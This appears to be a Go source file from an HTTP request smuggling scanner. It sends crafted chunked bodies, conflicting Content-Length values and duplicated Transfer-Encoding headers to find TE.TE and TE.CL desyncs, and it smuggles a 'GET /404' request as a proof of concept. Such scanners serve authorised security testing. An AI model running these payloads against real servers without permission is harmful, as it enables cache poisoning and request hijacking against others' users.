package smuggler

import (
	"fmt"
	"smuggler/config"
	"smuggler/smuggler/h1"
	"smuggler/smuggler/tests"
	"time"

	"github.com/rs/zerolog/log"
)

type TE struct {
	*DesyncerImpl
}

func (te *TE) Run() bool {
	if config.Glob.Concurrent {
		defer te.Wg.Done()
	}
	if !te.H1Supported {
		return false
	}
	return te.runTETE() || te.runTECL()
}

func (te *TE) runTETE() bool {
	log.Info().Str("endpoint", te.URL.String()).Msg("Running TE.TE desync tests...")
	generator := tests.Generator{}
	payload := generator.Generate(tests.TE, config.Glob.Test)

	ctr := 0
	for k, vv := range payload {
		for _, v := range vv {
			if err := te.GetCookie(); err != nil {
				log.Error().Err(err).Msg("")
				return false
			}
			payload := te.NewPl(fmt.Sprintf("%s:%s", k, v))
			if te._TETE(payload) {
				ctr++
				if config.Glob.ExitEarly {
					log.Info().
						Str("endpoint", te.URL.String()).
						Str("status", "success").
						Msgf("Test stopped on success: PoC payload stored in /result/%s directory", te.URL.Hostname())
					if config.Glob.Concurrent {
						te.TestDone <- struct{}{}
					}
					return true
				}
			}
			if config.Glob.Concurrent {
				select {
				case <-te.Ctx.Done():
					return false
				default:
				}
			}
		}
	}
	if ctr > 0 {
		log.Info().
			Str("endpoint", te.URL.String()).
			Str("status", "success").
			Msgf("finished TECL desync tests: PoC payload stored in /result/%s directory", te.URL.Hostname())
	} else {
		log.Info().
			Str("endpoint", te.URL.String()).
			Str("status", "failure").
			Msg("finished TECL desync tests: no issues found")
	}
	return false
}

func (te *TE) _TETE(p *h1.Payload) bool {
	body := "1\r\nG\r\nX\r\n"
	c := h1.Transport{}
	pl := te.NewPl(p.HdrPl)
	pl.Cl = 50
	pl.Body = body

	req := h1.Request{
		Url:     te.URL,
		Payload: pl,
		Timeout: time.Second * 3,
	}

	resp, err := c.RoundTrip(&req)
	if err != nil {
		return false
	}

	resp.Body.Close()
	if resp.StatusCode != 400 { // expect 400 if front-end uses TE
		return false
	}

	// send a duplicate TE and large CL header, timeout expected
	p.HdrPl = fmt.Sprintf("%s\r\n%sx", p.HdrPl, p.HdrPl)
	p.Cl = 50
	p.Body = "1\r\nG\r\n0\r\n\r\n"
	ret, _ := te.H1Test(p)
	if ret == 1 {
		log.Info().Msg("This might be a TE.TE desync symptom")
		te.GenReport(p)
		return true
	}
	return false
}

func (te *TE) runTECL() bool {
	log.Info().Str("endpoint", te.URL.String()).Msg("Running TECL desync tests...")
	generator := tests.Generator{}
	payload := generator.Generate(tests.TE, config.Glob.Test)

	ctr := 0
	for k, vv := range payload {
		for _, v := range vv {
			payload := te.NewPl(fmt.Sprintf("%s:%s", k, v))
			if te.tecl(payload) {
				ctr++
				if config.Glob.ExitEarly {
					log.Info().
						Str("endpoint", te.URL.String()).
						Str("status", "success").
						Msgf("Test stopped on success: PoC payload stored in /result/%s directory", te.URL.Hostname())
					if config.Glob.Concurrent {
						te.TestDone <- struct{}{}
					}
					return true
				}
			}
			if config.Glob.Concurrent {
				select {
				case <-te.Ctx.Done():
					return false
				default:
				}
			}
		}
	}
	if ctr > 0 {
		log.Info().
			Str("endpoint", te.URL.String()).
			Str("status", "success").
			Msgf("finished TECL desync tests: PoC payload stored in /result/%s directory", te.URL.Hostname())
	} else {
		log.Info().
			Str("endpoint", te.URL.String()).
			Str("status", "failure").
			Msg("finished TECL desync tests: no issues found")
	}
	return false
}

func (te *TE) tecl(p *h1.Payload) bool {
	p.Body = "0\r\n\r\nG"
	p.Cl = 6

	ctr := 0
	for {
		ret, err := te.H1Test(p)
		if ret != 1 {
			if ret == -1 {
				log.Debug().
					Str("endpoint", te.URL.String()).
					Str("payload", p.HdrPl).
					Err(err).Msg("")
			} else if ret == 2 {
				log.Debug().
					Str("endpoint", te.URL.String()).
					Msg("disconnected before timeout")
			}
			return false
		}
		p.Cl = 5
		ret2, err := te.H1Test(p)
		if ret2 == -1 {
			log.Debug().
				Str("endpoint", te.URL.String()).
				Err(err).Msg("")
			return false
		}
		p.Cl = 6
		if ret2 == 0 {
			ctr++
			if ctr < 3 {
				continue
			}
			log.Info().
				Str("endpoint", te.URL.String()).
				Msgf("Potential TECL issue found - %s@%s://%s%s",
					te.Method, te.URL.Scheme, te.URL.String(), te.URL.Path)
			inner := fmt.Sprintf("GET /404 HTTP/1.1\r\nHost: %s\r\nContent-Length: 50\r\n\r\nX=", te.URL.Hostname())
			tmp := fmt.Sprintf("1\r\nA\r\n%X\r\n%s\r\n0\r\n\r\n", len(inner), inner)
			p.Body = tmp
			p.Cl = len(fmt.Sprintf("1\r\nA\r\n%X\r\n", len(inner)))
			te.H1Test(p)
			te.H1Test(p)
			te.GenReport(p)
			return true // instead return a bool if sth is found
		}
		log.Debug().
			Str("endpoint", te.URL.String()).
			Str("payload", p.HdrPl).
			Err(err).Msg("TECL timeout on both length 5 and 6")
		return false
	}
}
